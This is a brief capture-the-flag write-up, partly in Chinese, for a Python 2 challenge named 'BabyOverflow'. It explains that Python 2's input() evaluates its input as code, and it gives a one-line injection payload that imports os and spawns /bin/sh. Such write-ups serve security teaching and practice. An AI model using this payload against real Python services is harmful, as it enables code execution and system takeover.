## BabyOverflow

+ Category: **Misc**
+ Difficulty: ☆
+ Tag: **python2**

## Description

Overflow?

## Solution

python2 input vulnerability，使用了 `eval` 作为函数的一部分，因此可以直接类似 pyjail 的方式操作

payload：`__import__("os").system("/bin/sh")`